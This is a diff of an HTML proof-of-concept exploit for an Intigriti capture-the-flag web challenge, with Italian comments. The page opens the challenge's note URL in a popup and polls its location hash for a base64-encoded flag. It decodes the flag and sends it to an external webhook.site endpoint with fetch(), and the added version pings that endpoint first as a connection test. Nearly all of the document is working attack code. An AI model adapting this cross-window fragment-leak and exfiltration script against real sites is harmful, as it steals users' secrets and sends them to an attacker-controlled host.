@@ -1,17 +1,26 @@
 <!DOCTYPE html>
-<html><body>
-<script>
-  const child = window.open('https://challenge-0325.intigriti.io/note/00000000-0000-0000-0000-000000000000');
-  const interval = setInterval(() => {
-    try {
-      const hash = child.location.hash;
-      if (hash.startsWith('#:')) {
-        clearInterval(interval);
-        const flag = atob(hash.slice(2)).split(':')[1];
-        fetch('https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?flag=' );
-        child.close();
-      }
-    } catch {}
-  }, 200);
-</script>
-</body></html>
+<html>
+<body>
+  <button onclick="run()">Test & Leak</button>
+  <script>
+    async function run() {
+      // 1️⃣ Test di connessione al webhook
+      await fetch('https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?test=ok');
+
+      // 2️⃣ Apri popup per catturare il fragment con FLAG
+      const child = window.open('https://challenge-0325.intigriti.io/note/00000000-0000-0000-0000-000000000000');
+      const interval = setInterval(() => {
+        try {
+          const hash = child.location.hash;
+          if (hash.startsWith('#:')) {
+            clearInterval(interval);
+            const flag = atob(hash.slice(2)).split(':')[1];
+            fetch('https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?flag=' + encodeURIComponent(flag));
+            child.close();
+          }
+        } catch {}
+      }, 200);
+    }
+  </script>
+</body>
+</html>
